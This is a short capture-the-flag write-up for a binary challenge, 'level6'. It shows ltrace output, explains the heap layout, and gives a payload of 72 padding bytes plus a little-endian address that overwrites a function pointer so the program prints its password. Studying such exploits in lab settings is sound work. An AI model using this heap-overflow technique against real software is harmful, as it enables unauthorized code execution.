# Level 6

## Initial Context

- One file: `level6`

## Solving the Challenge

The executable expects one argument.

If run using `ltrace`, we can see that there is 2 constant allocations.

```bash
$ ltrace ./level6 hello
...
malloc(64)                        = 0x0804a008
malloc(4)                         = 0x0804a050
strcpy(0x0804a008, "hello")
puts("Nope")
```

The program is copying `argv[1]` to the first allocated memory.

By looking at the code, we can also see that the second allocated memory contains a function pointer to the method saying "Nope".

We can try to override the second memory by `n`'s address:

```python
# padding of 64
"A" * 64

# padding of 8 to go from the first memory's end to the new memory start
+ "A" * 8

# n's address in LE
+ "\x54\x84\x04\x08"'
```

The program will `cat` the password for us, so no need to save the payload into a file, we can send it directly to the vulnerable program:

```bash
$ ./level6 $(python -c 'print "A" * (64 + 8) + "\x54\x84\x04\x08"')
<flag>
```
